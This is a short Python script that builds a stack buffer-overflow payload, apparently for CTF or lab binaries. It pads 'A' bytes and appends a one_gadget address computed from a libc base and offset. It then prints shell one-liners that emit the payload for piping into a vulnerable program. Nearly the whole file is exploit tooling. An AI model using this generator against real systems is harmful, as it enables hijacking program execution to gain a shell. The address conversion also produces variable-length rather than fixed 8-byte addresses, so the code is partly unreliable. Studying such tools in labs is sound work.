import os
import sys

# -   Buffer size = ??? bytes
#     -   b'\x41'\*???
# -   RBP = 8 bytes
# -   gadget addres = `b'0xbeadbeef'`

def toHexString(bytestring):
    """
    Converts a bytestring to a hexadecimal string representation.

    Args:
        bytestring: A bytes object representing the bytestring to convert.

    Returns:
        A string containing the hexadecimal representation of the input bytestring.
    """
    hex_string = "b'"
    for byte in bytestring:
        hex_string += f"\\x{byte:02x}"
    hex_string += "'"
    return hex_string

def int_to_bytes(value, byteorder):
    """
    Converts an integer to a bytes object.

    Args:
        value: An integer representing the value to convert.
        byteorder: A string specifying the byte order, either 'little' or 'big'.

    Returns:
        A bytes object representing the input integer.
    """
    return value.to_bytes((value.bit_length() + 7) // 8, byteorder)

def create_payload(gadget_addres, target_size, little_endian=True):
    """
    Creates a payload for a buffer overflow exploit.

    Args:
        gadget_addres: An integer representing the address of the gadget to call.
        target_size: An integer representing the size of the buffer to overflow.
        little_endian: A boolean indicating whether to use little endian byte order. Default is True.

    Raises:
        ValueError: If gadget_address is not an integer.

    Prints:
        Information about the payload size and how to run the payload.

    Returns:
        Nothing.
    """
    if not isinstance(gadget_addres, int):
        raise ValueError("Buffer address should be an integer")

    gadget_addres_bytes = int_to_bytes(gadget_addres, 'little' if little_endian else 'big')

    padding_size = target_size

    padding = b'\x41' * padding_size
    payload = padding + gadget_addres_bytes

    print("-----------------------")
    print(f"Padding size: {padding_size}")
    print(f"payload size: {len(payload)}")
    print("-----------------------")
    print("")
    print("Short:")
    print(f"$(python3 -c \"import sys; sys.stdout.buffer.write(b\'\\x41\'*{padding_size} + {toHexString(gadget_addres_bytes)})\")")
    print("")
    print("Long:")
    print(f"$(python3 -c \"import sys; sys.stdout.buffer.write({toHexString(payload)})\")")


if __name__ == "__main__":
    import argparse

    # create ArgumentParser object
    parser = argparse.ArgumentParser(description='Process some integers.')

    # add argument for gadget_addres
    parser.add_argument('--libc_address', help='an hex address (get by ldd <binary>)', required=True)
    parser.add_argument('--gadget_offset', help='an hex address (get by one_gadget <libc>)', required=True)

    # add argument for buffer_size
    parser.add_argument('--buffer_size', type=int, help='an integer representing the buffer size', required=True)

    # parse command-line arguments
    args = parser.parse_args()

    args.gadget_addres = int(args.libc_address, 16) + int(args.gadget_offset, 16)

    create_payload(args.gadget_addres, int(args.buffer_size))
